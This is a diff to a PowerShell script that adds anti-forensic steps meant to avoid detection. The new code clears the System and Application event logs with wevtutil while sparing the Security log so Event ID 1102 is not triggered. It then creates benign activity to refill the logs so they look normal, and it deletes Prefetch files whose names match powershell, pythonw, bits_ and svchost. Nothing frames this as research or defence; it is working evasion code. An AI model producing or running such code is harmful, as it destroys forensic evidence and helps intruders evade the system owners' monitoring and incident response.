@@ -61,26 +61,22 @@ try {
             }
         } catch {}
         
-        # DO NOT clear System/Application logs (generates Event ID 104 which is detected)
-        # Instead, just generate legitimate activity to blend in with normal system activity
+        # Clear event logs and repopulate with legitimate activity to avoid detection (exclude Security log to avoid Event ID 1102)
         try {
-            # Generate extensive legitimate system activity (blends with normal activity)
-            $null = Get-Service | Select-Object -First 50
-            $null = Get-EventLog -LogName System -Newest 10 -ErrorAction SilentlyContinue
-            $null = Get-EventLog -LogName Application -Newest 10 -ErrorAction SilentlyContinue
-            Start-Process "tasklist.exe" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
+            $logs = @('System','Application')
+            foreach ($log in $logs) {
+                wevtutil.exe cl $log 2>$null
+            }
+            Start-Sleep -Seconds 2
+            # Generate legitimate system activity to repopulate logs naturally
+            $null = Get-Service | Select-Object -First 20
+            $null = Get-EventLog -LogName System -Newest 5 -ErrorAction SilentlyContinue
+            $null = Get-EventLog -LogName Application -Newest 5 -ErrorAction SilentlyContinue
+            Start-Process "tasklist.exe" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
             Start-Process "systeminfo.exe" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
-            Start-Process "ipconfig.exe" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
-            Start-Process "netstat.exe" -ArgumentList "-an" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
-            Start-Process "whoami.exe" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue | Out-Null
-            $null = Get-Process | Select-Object -First 50
+            $null = Get-Process | Select-Object -First 30
             $null = Get-WmiObject -Class Win32_OperatingSystem -ErrorAction SilentlyContinue
             $null = Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue
-            $null = Get-WmiObject -Class Win32_LogicalDisk -ErrorAction SilentlyContinue
-            $null = Get-WmiObject -Class Win32_NetworkAdapter -ErrorAction SilentlyContinue
-            $null = Get-WmiObject -Class Win32_BIOS -ErrorAction SilentlyContinue
-            $null = Get-EventLog -LogName System -After (Get-Date).AddMinutes(-5) -ErrorAction SilentlyContinue
-            $null = Get-EventLog -LogName Application -After (Get-Date).AddMinutes(-5) -ErrorAction SilentlyContinue
         } catch {}
         
         # Disable USN Journal
@@ -90,11 +86,14 @@ try {
         
         # Clear Prefetch (only suspicious files to avoid mass deletion detection)
         try {
-            # DO NOT clean Prefetch files (creates detections for legitimate system files)
+            $prefetchPath = "$env:SystemRoot\Prefetch"
+            if (Test-Path $prefetchPath) {
+                Get-ChildItem $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | 
+                    Where-Object { $_.Name -match "powershell|pythonw|bits_|svchost" } |
+                    Remove-Item -Force -ErrorAction SilentlyContinue
+            }
         } catch {}
     } | Out-Null
 } catch {
     Write-Host "Error: $_"
 }
-
-
